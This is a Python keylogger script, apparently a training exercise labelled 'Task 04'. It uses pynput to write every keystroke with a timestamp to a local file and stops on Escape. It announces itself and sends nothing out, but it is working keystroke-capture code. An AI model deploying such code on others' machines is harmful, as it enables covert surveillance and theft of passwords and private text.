from pynput import keyboard
import logging
import os

# Configuration
LOG_FILE = "keylog.txt"

# Set up logging to save keys to the file
# The log file will be created in the same directory as the script.
logging.basicConfig(filename=LOG_FILE, 
                    level=logging.DEBUG, 
                    format='%(asctime)s: %(message)s')


def on_press(key):
    """Callback function executed when a key is pressed."""
    try:
        # Get a readable string for the key
        key_str = str(key).replace("'", "")
        
        # Special handling for common keys
        if key == keyboard.Key.space:
            key_str = ' [SPACE] '
        elif key == keyboard.Key.enter:
            key_str = '[ENTER]\n' # Add a newline in the log file
        
        # Log the keystroke
        logging.info(f"Key Pressed: {key_str}")

    except Exception:
        # For special keys like shift, ctrl, alt, etc.
        logging.info(f"Special Key Pressed: {key}")

def on_release(key):
    """Stops the listener when the 'Esc' key is pressed."""
    # Pressing Escape is the defined stop condition
    if key == keyboard.Key.esc:
        print("\nKeylogger stopped by user (Escape key pressed).")
        return False # This command stops the listener

# --- Main Keylogger Execution ---
if __name__ == "__main__":
    print("--- Task 04: Basic Keylogger Started ---")
    print(f"Logging keystrokes to: {LOG_FILE}")
    print("Press the 'Escape' (Esc) key to stop the keylogger.")
    print("-" * 50)

    # 1. Create a listener object and start listening
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        # 2. Block execution until the listener is stopped (by pressing Esc)
        listener.join()
    
    print(f"Keylogger finished. Check '{LOG_FILE}' for the collected logs.")
